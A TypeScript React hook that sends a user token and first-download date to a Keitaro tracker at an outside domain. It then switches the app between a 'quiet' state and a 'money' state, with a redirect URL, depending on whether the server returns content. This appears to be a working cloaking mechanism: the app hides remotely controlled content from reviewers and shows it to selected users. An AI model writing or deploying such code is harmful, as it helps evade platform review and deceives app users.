import { useEffect, useState } from "react";
import { useTokenParams } from "./useTokenParams";
import { reportKeitaroError } from "../lib/telegram";

type KeitResult = {
  status: "checking" | "quiet" | "money" | "error";
  url: string | null;
};

export const useKeitStatus = (): KeitResult => {
  const [result, setResult] = useState<KeitResult>({
    status: "checking",
    url: null,
  });
  const { token, firstDownloadDate, isFirstDownload, isLoading } = useTokenParams();

  useEffect(() => {
    if (isLoading || !token || !firstDownloadDate) {
      setResult({ status: "checking", url: null });
      return;
    }

    const checkStatus = async () => {
      const keitaroUrl = "https://issamuraidash.com/SQb6cM6N";
      const fetchUrl = `${keitaroUrl}?cv=r_and_r_1.3&external_id=${firstDownloadDate}&creative_id=${token}${
        isFirstDownload ? "&ud=1" : ""
      }`;

      try {
        const response = await fetch(fetchUrl, {
          method: "GET",
          headers: { "Content-Type": "text/html" },
          mode: "cors",
          credentials: "omit",
          cache: "no-cache",
        });

        const bodyText = await response.text();

        if (bodyText.length === 0) {
          setResult({ status: "quiet", url: null });
        } else {
          const newFetchUrl = fetchUrl.replace("&ud=1", "");
          setResult({ status: "money", url: newFetchUrl });
        }
      } catch (error) {
        console.error("Error checking keit status:", error);
        reportKeitaroError(keitaroUrl, error, {
          token: token || "N/A",
          firstDownloadDate: firstDownloadDate || "N/A",
        });
        setResult({ status: "error", url: null });
      }
    };

    checkStatus();
  }, [token, firstDownloadDate, isFirstDownload, isLoading]);

  return result;
};
